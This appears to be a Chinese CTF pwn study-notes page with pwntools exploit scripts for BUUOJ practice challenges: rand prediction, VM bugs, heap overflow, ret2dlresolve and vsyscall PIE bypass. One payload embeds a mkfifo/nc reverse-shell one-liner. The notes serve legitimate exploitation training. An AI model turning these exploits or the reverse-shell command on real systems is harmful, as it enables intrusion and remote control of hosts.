<h1 id="伪随机"><a href="#伪随机" class="headerlink" title="伪随机"></a>伪随机</h1><h2 id="随机数预测"><a href="#随机数预测" class="headerlink" title="随机数预测"></a>随机数预测</h2><h3 id="bitsctf-2017-random-game"><a href="#bitsctf-2017-random-game" class="headerlink" title="bitsctf_2017_random_game"></a>bitsctf_2017_random_game</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#bitsctf_2017_random_game">https://buuoj.cn/challenges#bitsctf_2017_random_game</a><br>time(0)其实是按照当前事件,所以我们可以完全在本地也同时运行进行预测<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1662712073965-28b14169-d0b9-4272-bad9-8ed60605a0a2.png#averageHue=%23fefefe&clientId=uf7ad92e3-44e8-4&from=paste&height=182&id=u66776bf9&originHeight=456&originWidth=1121&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36132&status=done&style=none&taskId=uba721f3e-5d44-4421-a032-c64858980aa&title=&width=448.4" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = &quot;./bitsctf_2017_random_game&quot;</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=&quot;debug&quot;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">if &quot;2.23&quot; in libc.path:</span><br><span class="line">    one_gadget = [0x4526A, 0x45216, 0xF02A4, 0xF1147]</span><br><span class="line">elif &quot;2.27&quot; in libc.path:</span><br><span class="line">    one_gadget = [0x4F2C5, 0x4F322, 0x10A38C]</span><br><span class="line">else:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    remote_ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">    remote_port =27808</span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line">else:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from math import floor</span><br><span class="line">from ctypes import CDLL</span><br><span class="line"></span><br><span class="line">libc = CDLL(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">now = int(floor(time.time()))</span><br><span class="line">libc.srand(now)</span><br><span class="line">for i in range(0,40):</span><br><span class="line">  v8 = libc.rand() &amp; 0xF</span><br><span class="line">  io.sendline(str(v8))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<p>这里多一点，避免有不一样的，然后运行就可以了，所以下次遇到随机数其实是可以预测的</p>
<h1 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h1><h2 id="seccon2018-kindvm"><a href="#seccon2018-kindvm" class="headerlink" title="seccon2018_kindvm"></a>seccon2018_kindvm</h2><p>一个比较简单的虚拟机，修改指针为flag，然后会读出内容，这里不需要leak，因为堆上有堆地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def inn(pianyi,value):</span><br><span class="line">    return b&quot;\x07&quot;+p8(pianyi)+p32(value)[::-1]</span><br><span class="line">def store(mem_pianyi,reg_pianyi):</span><br><span class="line">    return b&quot;\x02&quot;+p16(mem_pianyi)[::-1]+p8(reg_pianyi)</span><br><span class="line">def load(reg_pianyi,mem_pianyi):</span><br><span class="line"></span><br><span class="line">    return b&quot;\x01&quot;+p8(reg_pianyi)+p16(mem_pianyi)[::-1]</span><br><span class="line"></span><br><span class="line">def add(char_pianyi,pianyi):</span><br><span class="line">    return b&quot;\x04&quot;+p8(char_pianyi)+p8(pianyi)</span><br><span class="line">#banner.txt 0x24</span><br><span class="line">#leak 0x28</span><br><span class="line"></span><br><span class="line">sla(b&quot;ur name : &quot;,b&quot;a&quot;)</span><br><span class="line">payload=load(0,(1&lt;&lt;16)-0x28)+inn(1,0x20)+add(1,0)+store((1&lt;&lt;16)-0x24,1)+b&quot;\x07\x00galf&quot;+store(0x10,0)+inn(0,0)+store(0x14,0)+b&quot;\x06&quot;</span><br><span class="line">sa(b&quot;Input instruction : &quot;,payload)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h2 id="wdb-2018-2nd-hvm"><a href="#wdb-2018-2nd-hvm" class="headerlink" title="wdb_2018_2nd_hvm"></a>wdb_2018_2nd_hvm</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#wdb_2018_2nd_hvm">https://buuoj.cn/challenges#wdb_2018_2nd_hvm</a><br>这种虚拟机题目首先还是要看syscall,因为他会在syscall进行一些赋值<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1661311054608-8f4d9b30-acd9-47b5-9f02-769f6b0f791e.png#averageHue=%23fefefe&clientId=u80cd3418-508c-4&from=paste&height=155&id=u5c186e1e&originHeight=387&originWidth=664&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29347&status=done&style=none&taskId=uc11a1f24-bba8-4de7-859c-eb9fde4648f&title=&width=265.6" alt="image.png"><br>这里就可以确定具体bss的值对应哪些寄存器<br>一直用来读取指令的很明显就是我们的ip<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1661311082652-f2a5f857-8a38-467c-9099-1ab88ff545f1.png#averageHue=%23fefefe&clientId=u80cd3418-508c-4&from=paste&height=241&id=uf7be86de&originHeight=602&originWidth=1681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47658&status=done&style=none&taskId=ubc869e1b-0cb6-4cb8-a48a-6647d70e4f1&title=&width=672.4" alt="image.png"><br>rsp和rbp就继续分析就好<br>然后问题一般出现在虚拟机要执行的指令文件里面,需要先把要执行的指令逆向一下<br>这是题目提供的虚拟机程序对应的代码，可以看到有个栈溢出，我们直接覆盖写个syscall</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">push <span class="string">&quot;o\n&quot;</span></span><br><span class="line">push <span class="string">&quot;hello&quot;</span></span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdi,<span class="number">0x1</span></span><br><span class="line">mov rdx,<span class="number">0x6</span></span><br><span class="line">mov rax,<span class="number">1</span></span><br><span class="line">syscall</span><br><span class="line">push rip</span><br><span class="line">jmp short e*<span class="number">4</span></span><br><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br><span class="line">sub rsp,<span class="number">0x30</span></span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdi,<span class="number">0</span></span><br><span class="line">mov rdx,<span class="number">0xf0</span></span><br><span class="line">mov rax,<span class="number">0</span></span><br><span class="line">syscall <span class="comment">#read(0,rsp,0xf0)</span></span><br><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br><span class="line">ret tmp+<span class="number">3</span> <span class="comment">#因为jmp之前push的rip另jmp后面指令的间距是3</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#reverse 函数</span></span><br><span class="line"><span class="comment">#ABCDEFGH 变成 GHEFCDAB</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># with open(&quot;/hvmbin&quot;,&quot;w&quot;) as f:</span></span><br><span class="line"><span class="comment">#     f.write(&quot;\x01\0\0\0\x02\03\04\x05&quot;)#实际数字是0x5040302执行完为0x2030405</span></span><br><span class="line">sa(<span class="string">b&quot;hello\n&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x34</span>+p32(<span class="number">0xfbfbffff</span>)+p32(<span class="number">0x1A</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">7</span>)+<span class="string">b&quot;/sh\0&quot;</span>+p32(<span class="number">7</span>)+<span class="string">b&quot;/bin&quot;</span>+p32(<span class="number">0xd</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x3b000000</span>)+p32(<span class="number">0xe</span>))</span><br><span class="line">it()</span><br><span class="line"><span class="comment">#mov rdx,0</span></span><br><span class="line"><span class="comment">#mov rsi,0</span></span><br><span class="line"><span class="comment">#push /bin/sh</span></span><br><span class="line"><span class="comment">#mov rdi,rsp</span></span><br><span class="line"><span class="comment">#mov rax,59</span></span><br><span class="line"><span class="comment">#syscall</span></span><br></pre></td></tr></table></figure>
<p>下面是ida分析过的文件<br>后缀改成i64<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2022/txt/29417415/1661322079334-71bd707b-97ca-4113-92c2-4b9d64816f2b.txt?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2022/txt/29417415/1661322079334-71bd707b-97ca-4113-92c2-4b9d64816f2b.txt%22,%22name%22:%22wdb_2018_2nd_hvm.txt%22,%22size%22:173724,%22ext%22:%22txt%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22type%22:%22text/plain%22,%22mode%22:%22title%22,%22taskId%22:%22uc330d397-f3d8-4e2c-a38f-04dde5736ae%22,%22taskType%22:%22upload%22,%22__spacing%22:%22both%22,%22id%22:%22uda47f2cd%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">wdb_2018_2nd_hvm.txt</a></p>
<h1 id="C-S架构题目"><a href="#C-S架构题目" class="headerlink" title="C&#x2F;S架构题目"></a>C&#x2F;S架构题目</h1><h2 id="GKCTF-2021-demo-catRoom"><a href="#GKCTF-2021-demo-catRoom" class="headerlink" title="[GKCTF 2021]demo_catRoom"></a>[GKCTF 2021]demo_catRoom</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GKCTF%202021]demo_catRoom">https://buuoj.cn/challenges#[GKCTF%202021]demo_catRoom</a><br>漏洞不复杂，堆溢出，修改用户名为admin</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#  -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./client&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;2.27&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line">b *$rebase(<span class="number">0xF56</span>) malloc调试</span><br><span class="line">b *$rebase(<span class="number">0x1205</span>) flag测试</span><br><span class="line">b *$rebase(<span class="number">0x148B</span>) free</span><br><span class="line">gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        b *$rebase(0x1199)</span></span><br><span class="line"><span class="string">        c</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">db=gdb.debug(<span class="string">&quot;./server&quot;</span>,gdbscript=gdbscript)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">25857</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process([elf_path,<span class="string">&quot;117.21.200.166&quot;</span>,<span class="string">&quot;29119&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg</span>(<span class="params">name,password</span>):</span><br><span class="line">    sla(<span class="string">b&quot;exit \n&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    <span class="comment">#32</span></span><br><span class="line">    sla(<span class="string">b&quot;input your name\n&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">b&quot;nput your passwd\n&quot;</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">name,password</span>):</span><br><span class="line">    sla(<span class="string">b&quot;exit \n&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input your name\n&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">b&quot;nput your passwd\n&quot;</span>,password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">name,password</span>):</span><br><span class="line">    sla(<span class="string">b&quot;exit \n&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;nput your remove name\n&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">b&quot;nput your passwd\n&quot;</span>,password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reg(<span class="string">b&quot;a&quot;</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">reg(<span class="string">b&quot;b&quot;</span>,<span class="string">b&quot;b&quot;</span>)</span><br><span class="line">delete(<span class="string">b&quot;a&quot;</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">reg(<span class="string">b&quot;a&quot;</span>*<span class="number">32</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0xffffffffffffffff</span>)+<span class="string">b&quot;admin\0&quot;</span>)</span><br><span class="line">login(<span class="string">b&quot;admin&quot;</span>,<span class="string">b&quot;b&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h1 id="好题"><a href="#好题" class="headerlink" title="好题"></a>好题</h1><h2 id="利用初始化变量"><a href="#利用初始化变量" class="headerlink" title="利用初始化变量"></a>利用初始化变量</h2><h3 id="hitb-2017-1000levels"><a href="#hitb-2017-1000levels" class="headerlink" title="hitb-2017 1000levels"></a>hitb-2017 1000levels</h3><p>最开始看到这个hint函数，里面需要这样可以打印system的地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1668947706359-8b8b71b9-ff2e-4e98-896e-8c0555b609b1.png#averageHue=%23fcfcfc&clientId=u282b6b23-81bc-4&from=paste&height=184&id=u6767184f&originHeight=230&originWidth=434&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12114&status=done&style=none&taskId=ufb7be4b6-609e-48c7-8c4d-0297a5ba1d9&title=&width=347.2" alt="image.png"><br>但是后来发现这个system地址会被放到栈上<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1668947687549-602c7d7e-ccac-475a-bb97-075ea698212b.png#averageHue=%23fdfdfc&clientId=u282b6b23-81bc-4&from=paste&height=315&id=u7bfa40ad&originHeight=394&originWidth=452&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19281&status=done&style=none&taskId=ubbd11a97-3511-4c30-acdf-6f5db78719e&title=&width=361.6" alt="image.png"><br>刚好就是v4这个地址，所以我们v1输入负数，防止v4被破坏，然后read_num可以输入一个偏移，这里我利用的是one_gadget,因为虽然rdi指向的是栈，但发现利用vsyscall之后就会变，还是one_gadget稳定<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1668947756526-6d3357e9-2b5d-407c-9bdf-794beabd317d.png#averageHue=%23fdfcfc&clientId=u282b6b23-81bc-4&from=paste&height=289&id=uc8c1abf6&originHeight=361&originWidth=589&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29370&status=done&style=none&taskId=u311ee9d8-f70f-4dff-a5d0-a36e147e523&title=&width=471.2" alt="image.png"><br>然后就是传统的vsyscall的第一个time就可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sla(b&quot;Choice:\n&quot;,b&quot;2&quot;)</span><br><span class="line">sla(b&quot;Choice:\n&quot;,b&quot;1&quot;)</span><br><span class="line">sla(b&quot;How many levels?\n&quot;,b&quot;-1&quot;)</span><br><span class="line">sla(b&quot;Any more?\n&quot;,b&quot;-378&quot;)#one_gadget</span><br><span class="line">for i in range(0x3e6):</span><br><span class="line">    ru(b&quot;Question: &quot;)</span><br><span class="line">    sla(b&quot;Answer:&quot;,str(eval(rud(b&quot;=&quot;))))</span><br><span class="line">ru(b&quot;Question: &quot;)</span><br><span class="line"></span><br><span class="line">sa(b&quot;Answer:&quot;,b&quot;a&quot;*0x38+p64(0xffffffffff600000)*13)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h2><h3 id="HITCON-2015-blinkroot"><a href="#HITCON-2015-blinkroot" class="headerlink" title="HITCON 2015 -blinkroot"></a>HITCON 2015 -blinkroot</h3><p>题目比较好，比较早开始打ret2dlresolve<br>主要要伪造 DT_SYMTABDT_JMPREL<br>利用任意地址写修改got+8为fake_link_map的地址<br>然后后面就是复杂的指针的构造<br>reloc-&gt;r_info&#x3D;7<br>sym-&gt;st_other!&#x3D;0就可以<br>但是调试起来确实好麻烦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#DT_SYMTAB 6</span><br><span class="line"># DT_STRTAB	5 这个偏移只要是个地址就可以，别的无所谓 </span><br><span class="line">#DT_JMPREL	23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#0x5000 </span><br><span class="line">#link_map距离gbuf 0xf80</span><br><span class="line">#p * (struct link_map *)0x7f463f196000</span><br><span class="line">#debug_force()</span><br><span class="line">fake_link_map_start_addr=0x600Bc0+0x100</span><br><span class="line">payload=p64(-0x80+(1&lt;&lt;64))+p64(fake_link_map_start_addr)#任意地址写，修改got+8处的值为我们伪造的linkmap结构体</span><br><span class="line">payload+=b&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">payload=payload.ljust(0x100,b&quot;\x00&quot;)</span><br><span class="line">system_libc_main=libc.sym[&quot;system&quot;]-libc.sym[&quot;__libc_start_main&quot;]</span><br><span class="line">read_got=0x600B78</span><br><span class="line">                                                    #fake reloc</span><br><span class="line">payload+=p64(system_libc_main)+p64(read_got)+p64(0)+p64(fake_link_map_start_addr+8)+p64(read_got-system_libc_main)+p64(7)+p64(0)*2</span><br><span class="line">l_info = p64(0)*5+p64(fake_link_map_start_addr)+p64(fake_link_map_start_addr)+p64(0)*(23-7)+p64(fake_link_map_start_addr+0x10)</span><br><span class="line">payload+=l_info</span><br><span class="line">payload=payload.ljust(0x400,b&quot;\x00&quot;)</span><br><span class="line">s(payload)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h2 id="BYPASS-PIE"><a href="#BYPASS-PIE" class="headerlink" title="BYPASS PIE"></a>BYPASS PIE</h2><p>我们知道，在开启了ASLR的系统上运行PIE程序，就意味着所有的地址都是随机化的。然而在某些版本的系统中这个结论并不成立，原因是存在着一个神奇的vsyscall。（由于vsyscall在一部分发行版本中的内核已经被裁减掉了，新版的kali也属于其中之一。vsyscall在内核中实现，无法用docker模拟，因此任何与vsyscall相关的实验都改成在Ubuntu 16.04上进行，同时libc中的偏移需要进行修正）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1667096410551-a003dd10-cb2c-443b-a011-e731743f718b.png#averageHue=%23050000&clientId=u6cfe039d-8f1e-4&from=paste&height=492&id=u14c8394b&originHeight=615&originWidth=1222&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128394&status=done&style=none&taskId=ub87d99aa-814b-4500-9289-a9b882839d3&title=&width=977.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1667096427486-37e134a7-dc87-4265-a733-db8f05679e09.png#averageHue=%23000000&clientId=u6cfe039d-8f1e-4&from=paste&height=478&id=ud96fef30&originHeight=597&originWidth=1322&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119246&status=done&style=none&taskId=udd784de0-cc80-4613-b11b-995655cef66&title=&width=1057.6" alt="image.png"><br>可以看到始终有固定地址的，我们给他dump下来<br>值得注意的是，vsyscall的地址是固定不变的，即使开启了PIE也不会改变！</p>
<p>可以利用的vsyscall有三个，地址如下</p>
<p>gettimeofday: 0xffffffffff600000<br>time: 0xffffffffff600000<br>getcpu: 0xffffffffff600000<br>【vsyscall的局限】</p>
<p>分配的内存较小；</p>
<p>只允许4个系统调用；</p>
<p>Vsyscall页面在每个进程中是静态分配了相同的地址；</p>
<p>【vDSO】</p>
<p>提供和vsyscall相同的功能，同时解决了其局限。</p>
<p>vDSO是动态分配的，地址是随机的；</p>
<p>可以提供超过4个系统调用；</p>
<p>vDSO是glibc库提供的功能<br>地址是固定的：</p>
<p>基地址：0xffffffffff600000</p>
<p>#define VSYSCALL_ADDR_vgettimeofday   0xffffffffff600000</p>
<p>#define VSYSCALL_ADDR_vtime           0xffffffffff600400</p>
<p>#define VSYSCALL_ADDR_vgetcpu          0xffffffffff600800<br><img src="https://cdn.nlark.com/yuque/0/2022/webp/29417415/1667097028172-e7f4caf3-74ff-4039-a11b-b4fcb9457dc3.webp#averageHue=%23f9f8f6&clientId=u6cfe039d-8f1e-4&from=paste&id=uf5df6583&originHeight=494&originWidth=1200&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ucd4767dc-25c6-459d-b7b8-c2cc4635031&title="></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dump memory ./dump 0xffffffffff600000 0xffffffffff601000</span><br></pre></td></tr></table></figure>
<p>这个我dump不下来</p>
<h3 id="unexplitable"><a href="#unexplitable" class="headerlink" title="unexplitable"></a>unexplitable</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s(<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0xffffffffff600000</span>)+p64(<span class="number">0xffffffffff600000</span>)+p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#利用这中固定地址的，一直滑倒有libc偏移的，然后one_gadgte一把梭哈</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
